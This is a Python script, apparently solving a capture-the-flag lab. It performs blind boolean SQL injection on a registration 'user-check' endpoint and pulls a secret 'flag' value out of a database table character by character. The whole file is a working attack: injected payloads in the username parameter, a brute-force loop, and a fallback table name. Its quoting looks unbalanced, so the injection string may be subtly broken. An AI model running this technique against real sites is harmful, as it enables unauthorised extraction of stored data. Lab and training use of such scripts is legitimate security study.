import urllib.request
import urllib.parse
import string

target = "http://10.67.179.8"
charset = string.ascii_letters + string.digits + "{}:_"

def test_condition(condition):
    """Returns True if condition is true (available=false)"""
    params = urllib.parse.urlencode({"username": f"' OR ({condition})-- -"})
    url = f"{target}/register/user-check?{params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read().decode()
            return '"available":false' in data
    except:
        return False

# Extract flag character by character
flag = ""
for pos in range(1, 100):
    found = False
    for c in charset:
        condition = f"SELECT SUBSTRING(flag,{pos},1) FROM sqhell_5.flag LIMIT 1)='{c}"
        if test_condition(condition):
            flag += c
            print(f"Found so far: {flag}")
            found = True
            break
    if not found:
        if not flag:
            # Try with just the flag table name without database prefix
            pass
        else:
            print(f"Final: {flag}")
        break

if not flag:
    print("Trying without database prefix...")
    for pos in range(1, 100):
        found = False
        for c in charset:
            condition = f"SELECT SUBSTRING(flag,{pos},1) FROM flag LIMIT 1)='{c}"
            if test_condition(condition):
                flag += c
                print(f"Found so far: {flag}")
                found = True
                break
        if not found:
            break
    print(f"Final: {flag}")
